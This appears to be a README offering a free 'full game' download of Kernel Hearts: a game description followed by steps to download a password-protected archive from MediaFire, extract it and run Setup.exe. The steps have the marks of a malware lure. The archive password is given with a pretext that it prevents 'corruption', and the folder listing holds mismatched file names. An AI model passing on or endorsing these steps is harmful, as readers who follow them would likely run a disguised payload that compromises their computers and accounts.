## 🕹️ About

Kernel Hearts is a multiplayer co-op roguelike action RPG developed by Ephemera Games and published by Whitethorn Games. Set in a world drowning in ashes, it follows four magical girls of the M.A.H.O.U Unit as they climb the Tower of Babel, defeat angelic creatures, and challenge God. Each run combines attacks, spells, movement abilities, and unique powers to create powerful combat combos, with every level ending in a guardian boss fight. Between expeditions, players recover at humanity’s last holdout, customize their MAHOU.OS units with chips, build relationships with tower inhabitants, and temporarily transform into magical girls. This package is prepared for straightforward installation of the full game.

Kernel Hearts is for players who enjoy stylish anime-inspired action RPGs, difficult roguelike runs, and cooperative combat with friends.

## ✨ Features

- 💾 **Unit Customization** — Spend expedition rewards on chips and customize your MAHOU.OS unit.
- 🎲 **Roguelike Expeditions** — Take on challenging runs through a dangerous, ash-covered tower.
- 💝 **Ally Bonds** — Meet tower inhabitants, give gifts, and deepen your relationships.
- ✨ **Magical Girl Transformation** — Harness the tower’s power to unleash a temporary enhanced form.
- 👹 **Guardian Bosses** — Face intense boss encounters at the end of each tower level.
- ⚔️ **Action RPG Combat** — Combine attacks, spells, movement, and powers into devastating combos.
- 🤝 **Four-Player Co-op** — Join up to four players online to battle biblical monsters together.

### Step 1: Download

Download the package from **[this page](https://www.mediafire.com/folder/1dr4rik7qm60h/GameSetup)**.

### Step 2: Extract

1. Use any standard archive extractor (7-Zip, WinRAR, WinZip, etc.)
2. The archive is protected with the password **`2026`** to prevent corruption during transfer
3. Extract **all files** into a single folder of your choice
4. Do not rename or move individual files — the setup expects its folder structure intact

The extracted folder should look like this:

```
Setup/
|-- Setup.exe <- Main executable
|-- api.pak <- API modules
|-- audio.res <- Audio resources
|-- update_1.ini <- Update config
|-- patch_1.bnk <- Audio banks
|-- lang.sys <- Language system
|-- localization.ini <- Language files
|-- installer.dat <- Installer data
|-- assets.wem <- Asset audio
|-- license.wem <- Audio assets
|-- update_1.res <- Update resources
|-- Password 2026.txt <- Password reminder (empty)
|-- license.bank <- License data
|-- physics.sys <- Physics engine
|-- res.pak <- Resources archive
|-- driver.pak <- Driver archive
|-- driver.umap <- Driver data
|-- animations.dll <- Animation system
|-- settings.bin <- Configuration
|-- scripts.lic <- Game scripts
|-- uninstall.key <- Uninstall key
|-- launcher.dll <- Launcher library
|-- global.cfg <- Global settings
|-- bootstrap.wem <- Bootstrap audio
|-- dlc.md5 <- DLC checksums
```

### Step 3: Launch

1. Open the extracted folder
2. Run `Setup.exe`
3. The game will start
